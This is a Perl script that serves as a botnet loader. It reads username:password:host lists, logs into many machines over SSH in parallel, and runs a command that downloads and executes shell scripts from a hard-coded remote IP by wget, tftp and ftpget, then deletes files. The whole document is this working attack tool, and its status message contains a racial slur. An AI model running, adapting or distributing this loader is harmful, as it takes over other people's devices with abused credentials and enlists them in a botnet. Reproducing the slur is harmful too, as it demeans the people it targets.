#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.105.49.213/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; tftp 103.105.49.213 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 103.105.49.213; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.105.49.213 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[37;1mNigga They Joining: ".$newarray[$c]."\n";
                } else {
                        print "List Dead\n";
                }
        } else {
                print "Box Broken\n";
        }
        $pm->finish;
}
$pm->wait_all_children;
